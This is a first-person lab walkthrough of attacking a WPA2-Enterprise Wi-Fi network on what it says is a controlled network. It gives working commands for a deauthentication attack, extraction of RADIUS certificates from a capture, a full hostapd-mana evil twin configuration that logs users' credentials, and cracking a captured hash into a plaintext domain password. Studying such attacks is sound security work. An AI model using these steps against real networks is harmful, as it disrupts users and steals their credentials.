
> [!info]
> This was performed on a controlled network, meaning everything performed was both legal and ethical.

This walkthrough does not contain in-depth explanations of every tool used.  For references to the tools used, see my [Wireless Cheatsheet](../Tools/Wireless%20Cheatsheet.md).

## Overview
---
WPA2-EAP (also known as WPA-Enterprise) is a much more secure and scalable method of Wi-Fi network security compared to WPA2-PSK.  This type of Wi-Fi is more commonly found in large scale businesses and enterprise environments.

This form of Wi-Fi security utilizes EAP (Extensible Authentication Protocol) and a RADIUS (Remote Authentication Dial-in User Service) server for more robust and secure authentication; each user or device must authenticate individually, typically using a username and password or other credentials (such as digital certificates).

This means for authentication, a bad actor can't just capture the handshake between an end-user and the network.  Rather, the actor also needs to have end users mistakenly authenticate to them so that the users' credentials can be cracked and used for authentication.

## Capturing the WPA Handshake
---

```bash
# View Current WiFi Driver
sudo airmon-ng
# Create Monitor Interface
sudo airmon-ng start <interface>
```

![[Pasted image 20231015005332.png]]

With the monitor interface configured, next I began sniffing the network to find what networks are available.

```shell
# See available networks/channels/security
sudo airodump-ng <mon_interface>
```
*(In this case, my monitor interface is wlan0mon)*

![[Pasted image 20231015175212.png]]

This revealed the SSID of the WPA2-MGT network, that it's on channel 11, and that the MAC address is "02:13:37:BE:EF:03".

With this knowledge, I restarted my "airodump" listener, refining it to focus specifically on the target network.

```shell
# Capture wireless traffic to a file
sudo airodump-ng --bssid "02:13:37:BE:EF:03" -c 11 --write "<network_ssid>" wlan0mon
```
*(By specifying '--write', all traffic will be dumped into a file we can reference later.)*

In a separate terminal, I validated that the network was vulnerable to injection prior to performing a de-authentication attack.

```shell
# Perform an injection test
sudo aireplay-ng -9 -a "02:13:37:BE:EF:03" wlan0mon

# Perform a de-authentication attack
sudo aireplay-ng --deauth 100 -a "02:13:37:BE:EF:03" wlan0mon
```

![[Pasted image 20231015175445.png]]

![[Pasted image 20231015175530.png]]

After performing the de-authentication attack, I was able to capture a WPA handshake.

![[Pasted image 20231015175647.png]]

After capturing the WPA handshake, I closed my "airodump" listener and disabled my monitor interface.

```shell
# Remove monitor interface
sudo airmon-ng stop wlan0mon
```

![[Pasted image 20231015175905.png]]

Unlike a standard WPA2-PSK network, we can't just crack the passphrase for authentication. We need to have end users mistakenly authenticate to us via an Evil Twin, so that their credentials can be cracked and used for authentication.

## Extracting Certificates from the Capture
---

Next, I opened the packet capture that was created by my original "airodump" capture with Wireshark to grab the certificates.

```shell
wireshark ./<network_ssid>-01.cap
```

In Wireshark, I filtered on "tls.handshake.certificate" to pull up the frames containing certificates.

![[Pasted image 20230427210320.png]]

Once I filtered the packets, I was able to pull the certificates.

```
--> Extensible Authentication Protocol
	--> Transport Layer Security
		--> TLSv1.2 Record Layer: Handshake Protocol: Certificate
			--> Handshake Protocol: Certificate
				--> Certificates
```

![[Pasted image 20230427210518.png]]

Within the Certificates pane, there were two certificates -- a server certificate and a Certificate Authority certificate.  I made sure to export both of them for later.

```
Right Click Certificate --> Export Packet Bytes
```

![[Pasted image 20230427210721.png]]

I exported the certificate packet bytes to:

- "``<network_ssid>Certificate1.der``"
- "``<network_ssid>Certificate2.der``"

Once the certificates were exported, I was able to read them with "openssl" and validate the export was successful.

```shell
openssl x509 -inform der -in <network_ssid>Certificate1.der -text
openssl x509 -infrom der -in <network_ssid>Certificate2.der -text
```

![[Pasted image 20231015181048.png]]
*(We see above that this is a server certificate)*

![[Pasted image 20231015181225.png]]
*(Whereas this looks like a certificate authority certificate)*

## Configuring an Evil Twin AP
---

Next, I took the details within those certificates and copied them into the settings of a local RADIUS server ([freeRADIUS](https://freeradius.org/)) in order to configure an Evil Twin AP.  These files were created in the "/etc/freeradius/3.0/certs" directory and the values were as follows:

- Server Certificate: ``server.cnf``
![[Pasted image 20231015181639.png]]

- CA Certificate: ``ca.cnf``
![[Pasted image 20231015181431.png]]

Next, I rebuilt the certificates -- but first I had to delete the current Diffie-Hellman (DH) parameters to avoid potential errors down the line.

![[Pasted image 20231015182257.png]]

Now that the new certificates have been generated, I created a custom "hostapd-mana.conf" configuration file to utilize these certificates, allow clients to authenticate to my AP, and output authentication credentials to a "/tmp/hostapd.creds" file.

- Configuration File: ``/etc/hostapd-mana/hostapd-mana.conf``
```shell
# SSID of the AP
ssid=<ssid>

# Network interface to use and driver type
interface=wlan0
driver=nl80211

# Channel and mode
channel=<channel>
hw_mode=g

# Setting up hostapd as an EAP server
ieee8021x=1
eap_server=1

# Key workaround for Win XP
eapol_key_index_workaround=0

eap_user_file=/etc/hostapd-mana/mana.eap_user

# Certificate paths created earlier
ca_cert=/etc/freeradius/3.0/certs/ca.pem
server_cert=/etc/freeradius/3.0/certs/server.pem
private_key=/etc/freeradius/3.0/certs/server.key

# The password is actually 'whatever'
private_key_passwd=whatever
dh_file=/etc/freeradius/3.0/certs/dh

# Open authentication
auth_algs=1
wpa=3
wpa_key_mgmt=WPA-EAP
wpa_pairwise=CCMP TKIP

# Enable Mana WPE
mana_wpe=1
mana_credout=/tmp/hostapd.creds
mana_eapsuccess=1
mana_eaptls=1
```

- Example:
![[Pasted image 20231015183514.png]]

Lastly, I created an "/etc/hostapd-mana/mana.eap_user" file to increase the likelihood of targets being able to connect to my fake AP.

- Configuration File: ``/etc/hostapd-mana/mana.eap_user``
```
*     PEAP,TTLS,TLS,FAST
"t"   TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP,MSCHAPV2,MD5,GTC,TTLS,TTLS-MSCHAPV2    "pass"   [2]
```

- This format of the "hostapd.eap_user" file is as follows.
	- The first column indicates a specific user by username or, in the event of wildcard character (\*), any user. It can contain a domain name as well.
	- The second column contains the protocols allowed for the specific users and authentication phase.
	- The third one is optional and is used for the password when a specific user is mentioned.
	- The fourth one (indicated with "[2]"), indicates that the settings on this line are for phase 2 authentication.

- Example:
![[Pasted image 20231015184204.png]]

## Capturing Authenticated User Credentials
---

Once everything was configured, I started my Evil Twin AP for users to authenticate to.

![[Pasted image 20231015184433.png]]

Users began authenticating with my Evil Twin, and not only did I capture their hash, but also the domain name for the network.  This will be utilized for authentication later.

![[Pasted image 20230428022950.png]]

When users authenticate to the AP, their credentials are stored in "/tmp/hostapd.creds".  Looking into the file, it contains multiple different hashes so that you can crack it with your preferred hash cracking tool (asleap, johntheripper, hashcat, etc.).  Once these credentials are cracked, I would then be able to authenticate into the network as the cracked user.

![[Pasted image 20230427215617.png]]

Using the "asleap" syntax provided and feeding it "rockyou.txt" for a dictionary attack, I managed to crack the password for user "iris".

![[Pasted image 20231015184743.png]]

```
# Credentials
Username: Castle\iris
Password: patricia
```

